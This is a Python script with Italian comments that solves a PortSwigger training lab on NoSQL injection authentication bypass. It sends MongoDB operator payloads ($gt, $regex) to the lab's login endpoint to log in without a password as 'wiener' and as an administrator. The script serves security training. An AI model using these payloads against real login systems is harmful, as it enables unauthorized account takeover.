"""
    RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
    Refactoring con Typer e Rich
"""
import requests
import json
import typer
from urllib.parse import urljoin
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint

# Configurazione Rich Console
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "step": "bold magenta"
})
console = Console(theme=custom_theme)
app = typer.Typer(add_completion=False)

class NoSQLInjectionExploit:
    def __init__(self, lab_id: str):
        # Gestione input sia come ID puro che come URL completo
        if "web-security-academy.net" in lab_id:
            self.base_url = lab_id if lab_id.startswith("http") else f"https://{lab_id}"
        else:
            self.base_url = f"https://{lab_id}.web-security-academy.net"
            
        self.session = requests.Session()
        
    def check_lab_status(self):
        """Verifica la raggiungibilità del target"""
        try:
            with console.status(f"[bold]Connessione a {self.base_url}...[/bold]", spinner="dots"):
                response = self.session.get(self.base_url, timeout=10)
            
            if response.status_code == 200:
                console.print(f"[success]✔ Lab raggiungibile:[/success] {self.base_url}")
                return True
            else:
                console.print(f"[error]✘ Lab non raggiungibile (Status: {response.status_code})[/error]")
                return False
        except Exception as e:
            console.print(f"[error]✘ Errore connessione: {e}[/error]")
            return False
    
    def nosql_login(self, payload, description):
        """Esegue il login con payload NoSQL"""
        console.print(f"\n[info]➤ {description}[/info]")
        
        # Visualizzazione formattata del JSON payload
        json_str = json.dumps(payload, indent=2)
        syntax = Syntax(json_str, "json", theme="monokai", line_numbers=False)
        console.print(Panel(syntax, title="Payload Inviato", border_style="blue", expand=False))
        
        login_url = urljoin(self.base_url, "/login")
        headers = {"Content-Type": "application/json"}
        
        try:
            response = self.session.post(
                login_url, 
                json=payload, 
                headers=headers,
                allow_redirects=True
            )
            
            if response.status_code == 200 and ("My account" in response.text or "Log out" in response.text):
                user_found = "Utente sconosciuto"
                if "administrator" in response.text.lower() or "admin" in response.text.lower():
                    user_found = "[bold green]ADMINISTRATOR[/bold green]"
                elif "wiener" in response.text.lower():
                    user_found = "[yellow]Utente 'wiener'[/yellow]"
                
                console.print(f"[success]✔ Login riuscito![/success] Accesso come: {user_found}")
                return True
            else:
                console.print(f"[error]✘ Login fallito (Status: {response.status_code})[/error]")
                return False
                
        except Exception as e:
            console.print(f"[error]✘ Errore durante il login: {e}[/error]")
            return False
    
    def explore_vulnerability(self):
        console.print(Panel.fit("[bold]ESPLORAZIONE VULNERABILITÀ[/bold]", border_style="magenta"))

        # --- STEP 1 ---
        # Spiegazione tecnica: MongoDB operator $gt (greater than). 
        # Confrontando con una stringa vuota, la condizione è sempre True per qualsiasi stringa non vuota.
        console.print("\n[step]STEP 1 - Test: Bypass senza conoscere lo username[/step]")
        payload1 = {
            "username": {"$gt": ""},
            "password": "peter"
        }
        self.nosql_login(payload1, "Tentativo con operatore $gt (Greater Than) per username")
        
        self.session = requests.Session() # Reset sessione
        
        # --- STEP 2 ---
        # Spiegazione tecnica: Qui fissiamo lo username e bypassiamo la password sempre con $gt.
        # Questo dimostra che possiamo loggarci come chiunque senza password.
        console.print("\n[step]STEP 2 - Test: Bypass conoscendo solo lo username[/step]")
        payload2 = {
            "username": "wiener",
            "password": {"$gt": ""}
        }
        self.nosql_login(payload2, "Tentativo con operatore $gt per bypassare la password")

        self.session = requests.Session() # Reset sessione

        # --- STEP 3 ---
        # Spiegazione tecnica: Uso di Regex per enumerare o indovinare lo username dell'admin.
        console.print("\n[step]STEP 3 - Test: Login come administrator[/step]")
        payload3 = {
            "username": {"$regex": "admin.*"},
            "password": {"$gt": ""}
        }
        self.nosql_login(payload3, "Tentativo con Regex Injection per trovare 'admin'")
    
    def solve_lab(self):
        """Esegue l'exploit finale"""
        console.print(Panel.fit("[bold]SOLUZIONE LAB: NoSQL Injection Authentication Bypass[/bold]", border_style="green"))
        
        # Payload Finale
        # Combiniamo la regex per selezionare l'admin e il bypass della password
        payload_admin = {
            "username": {"$regex": "admin.*"},
            "password": {"$gt": ""}
        }
        
        success = self.nosql_login(
            payload_admin,
            "Login come administrator usando NoSQL regex injection"
        )
        
        if success:
            return self.verify_solution()
        else:
            console.print("[error]✘ Exploit fallito[/error]")
            return False

    def verify_solution(self):
        """Verifica se il lab è stato risolto"""
        console.print("\n[info]Verifica soluzione del lab...[/info]")
        
        try:
            response = self.session.get(self.base_url)
            
            if "Congratulations, you solved the lab!" in response.text:
                console.print(Panel(
                    "[bold green]★ LAB RISOLTO CON SUCCESSO! ★[/bold green]",
                    expand=True,
                    border_style="green"
                ))
                return True
            else:
                console.print("[warning]⚠ Login effettuato, ma il lab non risulta ancora 'Solved' nel banner.[/warning]")
                return False
                
        except Exception as e:
            console.print(f"[error]Errore verifica: {e}[/error]")
            return False

@app.command()
def main(
    lab_id: str = typer.Argument(..., help="L'ID del Lab o l'URL completo."),
    explore: bool = typer.Option(False, "--explore", "-e", help="Esegue la fase di esplorazione prima di risolvere il lab.")
):
    """
    Script per NoSQL Injection Authentication Bypass (PortSwigger Lab).
    """
    exploit = NoSQLInjectionExploit(lab_id)
    
    if not exploit.check_lab_status():
        raise typer.Exit(code=1)

    if explore:
        exploit.explore_vulnerability()
        console.print("\n" + "─"*50)
        console.print("[bold]Procedo con la soluzione finale...[/bold]")
        console.print("─"*50)
        exploit.session = requests.Session() # Reset sessione pulita per il solve
    
    if not exploit.solve_lab():
        raise typer.Exit(code=1)

if __name__ == "__main__":
    app()